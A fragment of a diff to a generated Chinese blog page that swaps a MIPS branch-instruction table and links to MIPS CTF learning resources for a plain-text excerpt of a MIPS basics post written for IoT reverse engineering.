-<td>分支跳转，比较两个寄存器的值决定是否跳转，条件为==</td>
-<td>beq $Rs, $Rt, target</td>
-</tr>
-<tr>
-<td>blt</td>
-<td>分支跳转，条件为&lt;</td>
-<td>blt $Rs, $Rt, target</td>
-</tr>
-<tr>
-<td>ble</td>
-<td>分支跳转，条件为&lt;=</td>
-<td>ble $Rs, $Rt, target</td>
-</tr>
-<tr>
-<td>bgt</td>
-<td>分支跳转，条件为&gt;</td>
-<td>bgt $Rs, $Rt, target</td>
-</tr>
-<tr>
-<td>bge</td>
-<td>分支跳转，条件为&gt;=</td>
-<td>bge $Rs, $Rt, target</td>
-</tr>
-<tr>
-<td>bne</td>
-<td>分支跳转，条件为!=</td>
-<td>bne $Rs, $Rt, target</td>
-</tr>
-<tr>
-<td>j</td>
-<td>无条件跳转到某一绝对地址</td>
-<td></td>
-</tr>
-<tr>
-<td>jal</td>
-<td>直接子程序调用，</td>
-<td></td>
-</tr>
-<tr>
-<td>jalr</td>
-<td>间接子程序调用</td>
-<td></td>
-</tr>
-</tbody></table>
-<h4 id="4-函数调用"><a href="#4-函数调用" class="headerlink" title="4.函数调用"></a>4.函数调用</h4><p>主要参考资料：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://xuanxuanblingbling.github.io/ctf/pwn/2020/09/24/mips/">HWS赛题入门MIPS Pwn</a></li>
-<li><a target="_blank" rel="noopener" href="https://b0ldfrev.gitbook.io/note/iot/mipsarm-hui-bian-xue-xi#3-zhi-ling-ge-shi">mips汇编学习</a></li>
-<li><a target="_blank" rel="noopener" href="https://b0ldfrev.gitbook.io/note/iot/mipsarm-hui-bian-xue-xi#3-zhi-ling-ge-shi">CTF-MIPS-入门指南</a></li>
-</ul>
+          要学习IOT逆向，准备入手的思科路由器是MIPS架构，在开始动手前先熟悉一下MIPS相关基础
+1.特点
+MIPS指令为固定4字节
+内存中的数据访问必须严格对齐
+本身不支持NX
 
-          
+2.寄存器
+
+
+寄存器编号
+名称
+说明
+
+
+
+$0
+$zero
+总是返回常量0
+
+
+$1
+$at
+保留给汇编器，不可做其他
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/11/19/MIPS-%E5%85%A5%E9%97%A8/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1054,9 +868,16 @@
       
         
           
-            <p>记于2020年11月19日，晴</p>
+          记于2020年11月19日，晴
 
           
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2020/11/19/%E7%94%B1%E6%AD%A4%E5%BC%80%E5%A7%8B/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
